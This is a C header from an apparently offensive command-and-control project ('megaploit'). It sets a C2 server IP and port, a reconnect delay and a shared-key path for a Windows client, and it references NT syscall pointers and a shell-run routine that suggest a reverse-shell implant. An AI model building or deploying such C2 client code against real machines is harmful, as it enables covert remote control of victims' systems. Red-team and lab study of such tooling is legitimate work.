/*
 * definitions.h  –  Shared globals and configuration for Source.c (legacy build)
 * ================================================================================
 * Included by the root-level Source.c monolith.  For the refactored client/
 * build use client/config.h and client/ntcalls.h directly.
 *
 * For new code, include the appropriate sub-directory header directly:
 *   #include "client/config.h"    <- connection parameters
 *   #include "client/ntcalls.h"   <- NT syscall pointers
 *   #include "client/shell.h"     <- shell_run()
 *   #include "tls/tls_client.h"   <- TLS context + API
 *   #include "server/config.h"    <- server listen parameters
 *   #include "server/server.h"    <- server_listen()
 *   #include "server/prompt.h"    <- run_prompt_loop()
 * == THIS SOURCE CODE IS OUTDATED AS OF THIS CURRENT COMMIT ==
 */

#pragma once
#ifndef DEFINITIONS_H
#define DEFINITIONS_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

/* Pull in the TLS layer (brings SChannel / BCrypt / Secur32 with it) */
#include "tls/tls_client.h"


/* ── C2 connection parameters ──────────────────────────────────────────────
 * These may be overridden at compile time via -D flags (see Makefile):
 *   make legacy C2_IP=10.0.0.1 C2_PORT=4444
 */
#ifndef C2_IP
#  define C2_IP      "192.168.1.226"
#endif
#ifndef C2_PORT
#  define C2_PORT    50005
#endif
#ifndef RECONNECT_DELAY
#  define RECONNECT_DELAY   10          /* seconds between reconnect attempts */
#endif

/* ── Shared secret key ─────────────────────────────────────────────────────
 * Path to the secret.key file.  The file contains 64 ASCII hex characters
 * (produced by megaploit/core/crypto.py) which are decoded to 32 raw bytes.
 * Matches the Python crypto.load_key() / server_authenticate() convention.
 */
#ifndef SECRET_KEY_PATH
#  define SECRET_KEY_PATH   "secret.key"
#endif
#define SECRET_KEY_LEN      32          /* decoded binary length              */

/* ── Legacy globals used by Source.c ───────────────────────────────────────
 * Defined as static so multiple TUs can include this header without ODR
 * violations.  Source.c is a single-TU build so this is fine.
 */
static const char     *sIP         = C2_IP;
static const uint16_t  sPort       = C2_PORT;
static WSADATA         wData;
static struct sockaddr_in socket_stdIn;

#endif /* DEFINITIONS_H */
